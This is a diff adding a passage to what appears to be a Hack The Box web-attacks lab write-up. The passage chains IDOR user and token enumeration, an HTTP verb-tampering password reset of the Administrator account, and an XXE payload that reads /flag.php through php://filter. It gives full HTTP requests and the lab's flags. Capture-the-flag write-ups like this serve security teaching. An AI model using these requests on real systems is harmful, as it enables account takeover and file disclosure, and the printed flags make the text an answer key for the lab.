@@ -5840,11 +5840,125 @@ Results: HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}
 
 Try to escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php'.
 
+We can enumerate user with the GET request:
+
 ```
+GET /api.php/user/74 HTTP/1.1
+```
+
+After launching an Intruder attack we retrieve users from uid 1 to uid 100. We filter them out and get the user Administrator:
+
+```
+HTTP/1.1 200 OK
+Date: Sun, 12 Jan 2025 21:42:51 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 90
+Keep-Alive: timeout=5, max=93
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+{"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}
+```
+
+We observe that we can change our password. But also, by retrieving the token for any other user with:
+
+```html
+GET /api.php/token/52
+```
+
+And for updating the password, the original request is:
+
+```html
+POST /reset.php HTTP/1.1
+Host: 94.237.62.184:54493
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://94.237.62.184:54493/settings.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 65
+Origin: http://94.237.62.184:54493
+Connection: keep-alive
+Cookie: PHPSESSID=7gjv9r7sbl1nvlrrlv2sbgjsfl; uid=74
+
+uid=74&token=e51a8a14-17ac-11ec-8e67-a3c050fe0c26&password=lalala
+```
+
+If we perform an HTTP verb tampering attack we can bypass the authorization restriction:
+
+```html
+GET /reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=lalala HTTP/1.1
+Host: 94.237.62.184:54493
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://94.237.62.184:54493/settings.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+Origin: http://94.237.62.184:54493
+Connection: keep-alive
+Cookie: PHPSESSID=7gjv9r7sbl1nvlrrlv2sbgjsfl; uid=74
+
 
 ```
 
-Results:
+We have updated the Administrator's password. Now we access to that account. We can see there is a new feature for creating an event. This is the original request that we send:
+
+```html
+POST /addEvent.php HTTP/1.1
+Host: 94.237.62.184:54493
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://94.237.62.184:54493/event.php
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 163
+Origin: http://94.237.62.184:54493
+Connection: keep-alive
+Cookie: PHPSESSID=7gjv9r7sbl1nvlrrlv2sbgjsfl; uid=52
+
+
+            <root>
+            <name>Name of event</name>
+            <details>lele</details>
+            <date>2025-01-13</date>
+            </root>
+```
+
+Our payload:
+
+```html
+POST /addEvent.php HTTP/1.1
+Host: 94.237.62.184:54493
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://94.237.62.184:54493/event.php
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 289
+Origin: http://94.237.62.184:54493
+Connection: keep-alive
+Cookie: PHPSESSID=7gjv9r7sbl1nvlrrlv2sbgjsfl; uid=52
+
+<?xml version = "1.0"?><!DOCTYPE foo [<!ENTITY example1 SYSTEM "php://filter/convert.base64-encode/resource=file:///flag.php"> ]>
+            <root>
+            <name>&example1;</name>
+            <details>lele</details>
+            <date>2025-01-13</date>
+            </root>
+```
+
+![](img/xxe_28.png)
+
+After decoding the response `PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K`
+we obtain: `<?php $flag = "HTB{m4573r_w3b_4774ck3r}"; ?>`
+
+Results: HTB{m4573r_w3b_4774ck3r}
 
 
 
